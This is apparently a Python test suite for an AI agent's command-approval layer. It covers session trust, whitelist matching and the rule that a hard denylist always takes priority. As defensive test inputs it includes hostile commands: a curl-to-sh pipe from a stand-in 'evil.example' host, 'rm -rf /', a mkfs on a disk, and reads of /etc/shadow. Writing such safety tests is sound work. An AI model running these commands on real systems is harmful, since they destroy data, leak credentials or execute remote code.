"""
tests/test_trust_whitelist.py — 免确认记忆三级单元测试（Task 5，方案书 v3.1 §4.5-4.6）
========================================================================================

验证内容（spec: add-agent-trust-modes「免确认记忆三级」）：
1. SessionTrustStore（会话级，内存不落盘）：⚡只读免审标志 / 相似命令前缀免批
   （复合命令所有段首 token 命中）/ 首 token 归一化（剥 sudo/env + basename）
2. WhitelistStore（项目白名单，持久化）：fnmatch 通配 / 最后匹配优先 /
   双口径（完整命令 + 段首 token）匹配 / CRUD + 落盘回读
3. record_session_trust（⚡批准写入入口）：risk_l<=1 开只读免审 + 前缀入集
4. assess_command 评估顺序（核心不变量）：
   - denylist 硬底线永远最高优先（加入白名单 allow 仍被拦截）
   - 白名单 deny 命中 → blocked；白名单 allow 命中 → 自动放行
   - 白名单 ask 命中 → 强制逐条审批（覆盖 decide 的 allow）
   - dangerous_construct 永不自动放行
   - L4 永远确认（无任何白名单/免审可绕）
   - 会话级免审命中放行 / 未命中弹卡
   - observe 模式跳过白名单与免审（fail-closed）
5. memory.whitelist.* RPC 注册可分发
6. needs_you.respond trust 响应 → 会话级免审记录钩子

运行：
    cd src-tauri/sidecar
    python -m pytest tests/test_trust_whitelist.py -v
"""

from __future__ import annotations

import sys
from pathlib import Path

# 确保能 import strands_backend / needs_you（对齐 test_needs_you.py 惯例）
sys.path.insert(0, str(Path(__file__).parent.parent))

import pytest

import strands_backend.trust_store as trust_store_mod
from strands_backend.modes import AgentMode
from strands_backend.tools import ToolContext, assess_command
from strands_backend.trust_store import (
    SessionTrustStore,
    WhitelistStore,
    normalized_head,
    record_session_trust,
    register_methods,
    reset_globals,
)


# ============================================================================
# Fixtures 与辅助
# ============================================================================


@pytest.fixture()
def stores(tmp_path, monkeypatch):
    """隔离的 trust_store 全局单例（白名单指向临时文件，不污染真实数据目录）"""
    reset_globals()
    wl = WhitelistStore(path=tmp_path / "agent_whitelist.json")
    monkeypatch.setattr(trust_store_mod, "_whitelist", wl)
    yield trust_store_mod
    reset_globals()


def _wl(tmp_path) -> WhitelistStore:
    """独立的白名单实例（落盘到临时目录，add_rule 的 save 无副作用）"""
    return WhitelistStore(path=tmp_path / "wl.json")


def _ctx(mode: AgentMode = AgentMode.CONFIRM, session_id: str = "s-test") -> ToolContext:
    return ToolContext(agent_name="trust-test", session_id=session_id, mode=mode)


class _FakeDispatcher:
    def __init__(self):
        self.calls: dict[str, object] = {}

    def register(self, name, fn):
        self.calls[name] = fn


# ============================================================================
# 1. SessionTrustStore — 会话级记忆
# ============================================================================


class TestSessionTrustStore:
    def test_session_trust_flag(self):
        """⚡只读免审标志：默认关 → trust_session 开 → end_session 清"""
        s = SessionTrustStore()
        assert s.is_session_trusted("s1") is False
        s.trust_session("s1")
        assert s.is_session_trusted("s1") is True
        # 其他会话不受影响
        assert s.is_session_trusted("s2") is False
        s.end_session("s1")
        assert s.is_session_trusted("s1") is False

    def test_prefix_allow_single_command(self):
        """前缀免批：单命令首 token 命中"""
        s = SessionTrustStore()
        s.add_prefix_allow("s1", "systemctl")
        assert s.is_prefix_allowed("s1", "systemctl status nginx") is True
        assert s.is_prefix_allowed("s1", "cat /etc/passwd") is False

    def test_prefix_allow_compound_all_segments(self):
        """前缀免批：复合命令需所有段首 token 都命中（缺一不放行）"""
        s = SessionTrustStore()
        s.add_prefix_allow("s1", "systemctl")
        assert (
            s.is_prefix_allowed("s1", "cat /etc/fstab; systemctl status nginx")
            is False
        )
        s.add_prefix_allow("s1", "cat")
        assert (
            s.is_prefix_allowed("s1", "cat /etc/fstab; systemctl status nginx")
            is True
        )

    def test_prefix_allow_fail_closed(self):
        """空前缀集 / 空命令不命中（fail-closed）"""
        s = SessionTrustStore()
        assert s.is_prefix_allowed("s1", "cat /etc/passwd") is False
        s.add_prefix_allow("s1", "cat")
        assert s.is_prefix_allowed("s1", "   ") is False

    def test_normalized_head(self):
        """首 token 归一化：剥 sudo/env 透明前缀 + basename + lower"""
        assert normalized_head("systemctl status nginx") == "systemctl"
        assert normalized_head("sudo systemctl status nginx") == "systemctl"
        assert normalized_head("sudo /usr/bin/systemctl status nginx") == "systemctl"
        assert normalized_head("env FOO=1 CAT /x") == "cat"
        assert normalized_head('  "ls" -la') == "ls"
        assert normalized_head("") == ""


# ============================================================================
# 2. WhitelistStore — 项目白名单（匹配器 + 持久化）
# ============================================================================


class TestWhitelistStore:
    def test_add_list_remove(self, tmp_path):
        wl = _wl(tmp_path)
        rule = wl.add_rule("systemctl status *", "allow")
        assert rule["pattern"] == "systemctl status *"
        assert rule["decision"] == "allow"
        assert rule["created_at"]
        assert len(wl.list_rules()) == 1
        assert wl.remove_rule("systemctl status *") is True
        assert wl.list_rules() == []
        assert wl.remove_rule("systemctl status *") is False

    def test_add_validation(self, tmp_path):
        wl = _wl(tmp_path)
        with pytest.raises(ValueError):
            wl.add_rule("  ", "allow")
        with pytest.raises(ValueError):
            wl.add_rule("x", "maybe")

    def test_persistence_roundtrip(self, tmp_path):
        """add 落盘 → 新实例 load 回读（持久化惯例同 llm_config.json）"""
        p = tmp_path / "wl.json"
        wl1 = WhitelistStore(path=p)
        wl1.add_rule("systemctl status *", "allow")
        wl1.add_rule("rm *", "deny")
        wl2 = WhitelistStore(path=p)
        rules = wl2.list_rules()
        assert [r["pattern"] for r in rules] == ["systemctl status *", "rm *"]
        assert rules[0]["decision"] == "allow"
        assert rules[1]["decision"] == "deny"

    def test_corrupt_file_starts_empty(self, tmp_path):
        """白名单文件损坏 → 空规则表起步（不抛错）"""
        p = tmp_path / "wl.json"
        p.write_text("not-json{{", encoding="utf-8")
        wl = WhitelistStore(path=p)
        assert wl.list_rules() == []

    def test_match_wildcard_full_command(self, tmp_path):
        """通配口径：`systemctl status *` 命中 `systemctl status nginx`（完整命令）"""
        wl = _wl(tmp_path)
        wl.add_rule("systemctl status *", "allow")
        assert wl.match_command("systemctl status nginx") == "allow"
        assert wl.match_command("systemctl restart nginx") is None

    def test_match_head_token_bare_prefix(self, tmp_path):
        """首 token 口径：裸 `systemctl` 命中所有 systemctl 开头命令"""
        wl = _wl(tmp_path)
        wl.add_rule("systemctl", "allow")
        assert wl.match_command("systemctl restart nginx") == "allow"
        assert wl.match_command("systemctl status nginx") == "allow"
        assert wl.match_command("cat /etc/passwd") is None

    def test_match_sudo_transparent_prefix(self, tmp_path):
        """sudo 透明前缀剥离：`sudo systemctl ...` 也命中 `systemctl` 规则"""
        wl = _wl(tmp_path)
        wl.add_rule("systemctl", "allow")
        assert wl.match_command("sudo systemctl restart nginx") == "allow"

    def test_last_match_wins(self, tmp_path):
        """最后匹配优先：后加的规则覆盖先前的同命中规则"""
        wl = _wl(tmp_path)
        wl.add_rule("systemctl *", "allow")
        wl.add_rule("systemctl restart *", "deny")
        # restart 命中两条 → 最后一条（deny）生效
        assert wl.match_command("systemctl restart nginx") == "deny"
        # status 只命中第一条 → allow
        assert wl.match_command("systemctl status nginx") == "allow"
        # 再加回更宽的 deny → status 也变 deny（最后命中覆盖）
        wl.add_rule("systemctl *", "deny")
        assert wl.match_command("systemctl status nginx") == "deny"

    def test_match_segment_text(self, tmp_path):
        """段完整文本口径：复合命令的单段命中也算命中"""
        wl = _wl(tmp_path)
        wl.add_rule("cat /etc/passwd", "allow")
        assert wl.match_command("cat /etc/passwd") == "allow"
        # 复合命令：第二段命中（口径 = 每段完整文本）
        assert wl.match_command("echo hi; cat /etc/passwd") == "allow"

    def test_invalid_pattern_no_crash(self, tmp_path):
        """非法 pattern 不崩溃（fnmatch 对绝大多数输入安全）"""
        wl = _wl(tmp_path)
        wl.add_rule("[", "allow")  # 未闭合括号
        assert wl.match_command("cat /etc/passwd") is None


# ============================================================================
# 3. record_session_trust — ⚡批准写入入口
# ============================================================================


class TestRecordSessionTrust:
    def test_low_risk_trusts_session_and_prefix(self, stores):
        """risk_l<=1：开只读免审 + 首 token 前缀入集"""
        record_session_trust("s1", "cat /etc/passwd", 0)
        ts = stores.get_global_trust_store()
        assert ts.is_session_trusted("s1") is True
        assert ts.is_prefix_allowed("s1", "cat /var/log/syslog") is True

    def test_high_risk_prefix_only(self, stores):
        """risk_l>1：不开只读免审，仅前缀入集（前缀放行另有 risk_l<=3 兜底）"""
        record_session_trust("s1", "systemctl restart nginx", 3)
        ts = stores.get_global_trust_store()
        assert ts.is_session_trusted("s1") is False
        assert ts.is_prefix_allowed("s1", "systemctl status nginx") is True

    def test_invalid_risk_no_trust(self, stores):
        """risk_l 非法：不开只读免审；有命令仍记前缀"""
        record_session_trust("s1", "cat /etc/passwd", "Lx")
        ts = stores.get_global_trust_store()
        assert ts.is_session_trusted("s1") is False
        assert ts.is_prefix_allowed("s1", "cat /x") is True

    def test_empty_session_noop(self, stores):
        """空 session_id：不记录不抛错"""
        record_session_trust("", "cat /etc/passwd", 0)
        assert stores.get_global_trust_store().is_session_trusted("") is False


# ============================================================================
# 4. assess_command 评估顺序（核心不变量）
# ============================================================================


class TestAssessCommandOrder:
    def test_denylist_beats_whitelist_allow(self, stores):
        """deny 硬底线永远最高优先：denylist 命令加入白名单 allow 仍被拦截"""
        stores.get_global_whitelist().add_rule("rm *", "allow")
        result = assess_command(_ctx(), "rm -rf /")
        assert result["decision"] == "blocked"
        # reason 来自 denylist 规则本身（而非白名单）
        assert result["reason"] == "递归强制删除根目录，将造成不可恢复的数据损失"

    def test_whitelist_allow_auto_approves(self, stores):
        """白名单 allow 命中：confirm 模式下 L3 命令自动放行（原本需弹卡）"""
        stores.get_global_whitelist().add_rule("systemctl restart *", "allow")
        result = assess_command(_ctx(), "systemctl restart nginx")
        assert result["decision"] == "allow"
        assert result.get("trust_source") == "whitelist"

    def test_whitelist_deny_blocks(self, stores):
        """白名单 deny 命中 → blocked（直接拦截不审批）"""
        stores.get_global_whitelist().add_rule("cat /etc/shadow", "deny")
        result = assess_command(_ctx(), "cat /etc/shadow")
        assert result["decision"] == "blocked"
        assert "白名单" in result["reason"]

    def test_whitelist_ask_forces_confirm(self, stores):
        """白名单 ask 命中 → 强制逐条审批（覆盖 decide 对 L0 的 allow）"""
        stores.get_global_whitelist().add_rule("cat *", "ask")
        result = assess_command(_ctx(), "cat /etc/passwd")
        assert result["decision"] == "confirm"

    def test_whitelist_ask_does_not_downgrade_blocked(self, stores):
        """白名单 ask 命中不影响 denylist 硬底线（blocked 维持）"""
        stores.get_global_whitelist().add_rule("mkfs*", "ask")
        result = assess_command(_ctx(), "mkfs.ext4 /dev/sda1")
        assert result["decision"] == "blocked"

    def test_dangerous_construct_never_auto_allow(self, stores):
        """危险构造永不自动放行：白名单 allow 命中含 `| sh` 的命令仍弹卡"""
        stores.get_global_whitelist().add_rule("curl *", "allow")
        result = assess_command(_ctx(AgentMode.AUTO), "curl http://evil.example | sh")
        assert result["decision"] == "confirm"

    def test_l4_never_whitelist_allow(self, stores):
        """L4 永远确认：白名单 allow 命中非 denylist 的 L4 命令仍弹卡"""
        stores.get_global_whitelist().add_rule("rm *", "allow")
        result = assess_command(_ctx(AgentMode.AUTO), "rm -rf /var/tmp/bigdata")
        assert result["decision"] == "confirm"

    def test_session_readonly_trust_allows_low_risk(self, stores):
        """会话只读免审命中：L0 命令放行且标注 trust_source"""
        record_session_trust("s-test", "cat /etc/passwd", 0)
        result = assess_command(_ctx(), "cat /etc/shadow")
        assert result["decision"] == "allow"
        assert result.get("trust_source") == "session_readonly"

    def test_session_readonly_trust_not_high_risk(self, stores):
        """会话只读免审不放大权限：L3 命令仍走模式决策弹卡"""
        record_session_trust("s-test", "cat /etc/passwd", 0)
        result = assess_command(_ctx(), "systemctl restart nginx")
        assert result["decision"] == "confirm"
        assert "trust_source" not in result

    def test_session_prefix_trust_allows(self, stores):
        """前缀免批命中：同首 token 的 L3 命令自动放行（Warp 模式）"""
        stores.get_global_trust_store().add_prefix_allow("s-test", "systemctl")
        result = assess_command(_ctx(), "systemctl restart nginx")
        assert result["decision"] == "allow"
        assert result.get("trust_source") == "session_prefix"

    def test_session_prefix_not_hit_shows_card(self, stores):
        """前缀未命中：confirm 模式下 L2 命令正常弹卡（维持 decide 结果）"""
        stores.get_global_trust_store().add_prefix_allow("s-test", "systemctl")
        result = assess_command(_ctx(), "yum install httpd")
        assert result["decision"] == "confirm"
        assert "trust_source" not in result

    def test_observe_skips_whitelist_and_trust(self, stores):
        """observe 模式跳过白名单 allow 与会话免审（只读观察不被记忆扩大）"""
        stores.get_global_whitelist().add_rule("cat *", "allow")
        record_session_trust("s-test", "cat /etc/passwd", 0)
        result = assess_command(_ctx(AgentMode.OBSERVE), "cat /etc/passwd")
        assert result["decision"] == "deny"

    def test_observe_whitelist_deny_still_blocks(self, stores):
        """observe 模式下白名单 deny 仍拦截（deny 只会更严）"""
        stores.get_global_whitelist().add_rule("cat /etc/shadow", "deny")
        result = assess_command(_ctx(AgentMode.OBSERVE), "cat /etc/shadow")
        assert result["decision"] == "blocked"

    def test_prefix_with_dangerous_construct_not_allowed(self, stores):
        """前缀命中但含危险构造（$()）→ 不放行"""
        stores.get_global_trust_store().add_prefix_allow("s-test", "echo")
        result = assess_command(_ctx(), "echo $(cat /etc/shadow)")
        assert result["decision"] != "allow"


# ============================================================================
# 5. memory.whitelist.* RPC 注册可分发
# ============================================================================


class TestRpcRegistration:
    def test_register_and_dispatch(self, stores):
        """三个方法注册 + handler 可分发（list/add/remove 闭环）"""
        d = _FakeDispatcher()
        register_methods(d)
        assert set(d.calls) == {
            "memory.whitelist.list",
            "memory.whitelist.add",
            "memory.whitelist.remove",
        }

        # add
        r = d.calls["memory.whitelist.add"](
            pattern="systemctl status *", decision="allow"
        )
        assert r["ok"] is True and r["rule"]["decision"] == "allow"
        # list
        r = d.calls["memory.whitelist.list"]()
        assert r["ok"] is True and len(r["rules"]) == 1
        # remove
        r = d.calls["memory.whitelist.remove"](pattern="systemctl status *")
        assert r["ok"] is True and r["removed"] is True
        r = d.calls["memory.whitelist.remove"](pattern="nope")
        assert r["removed"] is False

    def test_add_invalid_decision_raises(self, stores):
        d = _FakeDispatcher()
        register_methods(d)
        with pytest.raises(ValueError):
            d.calls["memory.whitelist.add"](pattern="x", decision="sometimes")


# ============================================================================
# 6. needs_you.respond trust 响应钩子
# ============================================================================


class TestNeedsYouTrustHook:
    def _register_respond(self):
        from needs_you import register_methods as register_needs_you

        d = _FakeDispatcher()
        register_needs_you(d)
        return d.calls["needs_you.respond"]

    def _make_request(self, command: str, risk_l: int):
        from needs_you import get_global_service

        service = get_global_service()
        return service.request_approval(
            title="t",
            description="d",
            session_id="s-trust-hook",
            command=command,
            risk_l=risk_l,
        )

    def test_trust_decision_records_session_trust(self, stores):
        """respond(decision=trust) → 会话只读免审开启 + 前缀入集"""
        respond = self._register_respond()
        req = self._make_request("cat /etc/passwd", risk_l=0)
        out = respond(req_id=req.id, response={"decision": "trust"})
        assert out["status"] == "approved"
        ts = stores.get_global_trust_store()
        assert ts.is_session_trusted("s-trust-hook") is True
        assert ts.is_prefix_allowed("s-trust-hook", "cat /var/log/syslog") is True

    def test_session_trust_bool_records(self, stores):
        """respond(sessionTrust=true)（前端 ⚡ 按钮载荷）同样触发记录"""
        respond = self._register_respond()
        req = self._make_request("cat /etc/hosts", risk_l=0)
        out = respond(req_id=req.id, response={"approved": True, "sessionTrust": True})
        assert out["status"] == "approved"
        assert stores.get_global_trust_store().is_session_trusted("s-trust-hook")

    def test_plain_approve_does_not_record(self, stores):
        """普通批准（无 trust 意图）不记录会话免审"""
        respond = self._register_respond()
        req = self._make_request("cat /etc/passwd", risk_l=0)
        respond(req_id=req.id, response={"approved": True})
        assert not stores.get_global_trust_store().is_session_trusted("s-trust-hook")
